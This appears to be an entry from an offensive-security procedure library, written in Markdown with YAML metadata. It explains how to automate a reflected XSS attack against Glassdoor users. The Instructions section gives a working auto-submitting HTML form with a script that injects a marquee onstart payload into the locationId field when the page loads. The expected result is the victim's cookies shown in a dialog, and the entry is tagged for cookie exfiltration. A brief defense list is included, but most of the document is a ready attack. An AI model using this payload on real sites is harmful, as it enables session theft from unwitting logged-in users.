---
id: proc-uuid-4
tags:
  - xss
  - execution-trigger
  - automation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:33.922Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Automate Form Submission to Trigger XSS

## Summary

This procedure adds JavaScript to the malicious HTML form to automatically set the payload in locationId and submit it upon page load, enabling seamless delivery and execution of the XSS in the victim's browser while logged into Glassdoor.

## Description

With the form constructed, embed JS to dynamically update the locationId input and trigger submission. This simulates a drive-by attack when the victim opens the page. Test by opening the HTML file in a logged-in browser session to observe the payload execution and cookie popup.

## Requirements

1. Completed HTML form from prior procedure
2. Victim-like browser session (logged into Glassdoor)
3. Basic JavaScript knowledge for form manipulation

## Defense

Defensive measures and detection strategies:

- Educate users on phishing risks with external HTML pages
- Browser extensions to block auto-submitting forms
- Server-side logging of rapid or anomalous submissions from same IP

## Objectives

1. Ensure automatic payload delivery without user interaction
2. Confirm XSS execution in target context
3. Demonstrate impact like cookie theft

## Instructions

### Step 1: Embed JavaScript

**Context**: Add script to set payload and submit on load.

Include <script>document.getElementById('locId').value = 'payload'; document.forms[0].submit();</script> with an <input id="locId" type="hidden" name="locationId">

### Step 2: Prepare for Testing

**Context**: Update the form to use dynamic input for locationId.

Modify HTML to have <input id="locId" type="hidden" name="locationId" value=""> and the script sets the full payload.

```html
<script>
  window.onload = function() {
    document.getElementById('locId').value = '><marquee onstart="[cookie].find(confirm)">';
    document.forms[0].submit();
  };
</script>
```

> On load, payload is injected and form submits to Glassdoor.

### Step 3: Execute and Observe

**Context**: Open HTML in browser logged into Glassdoor.

Load the file; it auto-submits, redirects to editJobAlert.htm, and triggers the marquee onstart.

**Expected Output**: Confirm dialog pops with cookie contents, proving execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[auto-submit]]
- [[cookie-exfil]]
